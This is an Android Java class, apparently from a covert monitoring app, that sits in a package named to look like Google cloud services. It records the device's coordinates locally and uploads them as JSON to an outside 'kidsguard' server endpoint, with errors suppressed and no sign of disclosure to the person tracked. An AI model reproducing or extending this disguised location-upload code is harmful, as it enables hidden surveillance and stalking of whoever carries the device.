package com.google.cloudservices;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SendCordinate {
    String url;
    String keys;
    public void SendCorServer(final Context context,final String x1,final String y1){

        try {

            Cordb cordb=new Cordb(context);
            sm sm=new sm();
            url="https://im.kidsguard.pro/api/add-coordinate/";
            keys="cordinate";
            if (cordb.getcor().equals("1")){
                cordb.Insertcor(x1.substring(0,6),y1.substring(0,7));
                Log.e("SendCorServer",getcorjson(context,x1,y1)  );
                sm.add(context,url,keys,getcorjson(context,x1,y1));
            }else if (cordb.getcor().equals(x1.substring(0,6)+":"+y1.substring(0,7))){}else {
                cordb.Updatecor(x1.substring(0,6),y1.substring(0,7));
                Log.e("SendCorServer2",getcorjson(context,x1,y1)  );
                sm.add(context,url,keys,getcorjson(context,x1,y1));

            }
        }catch (Exception e){
        }finally {
            keys=null;
            url=null;
        }
        }
    JSONObject cordinatejson;
    JSONArray cordinatearray;
    public String getcorjson(Context context,String x,String y){

       try {
           cordinatejson=new JSONObject();
            cordinatejson.put("x",x);
            cordinatejson.put("y",y);
            cordinatearray=new JSONArray();
           cordinatearray.put(cordinatejson);

           String cordin= String.valueOf(cordinatearray);


           return cordin;
        } catch (JSONException e) {
           SendEror sendEror=new SendEror();
           sendEror.sender(context,"send cordinate:"+e.toString());
            e.printStackTrace();
        }finally {
           cordinatejson=null;
           cordinatearray=null;
       }
        return "";

    }


}
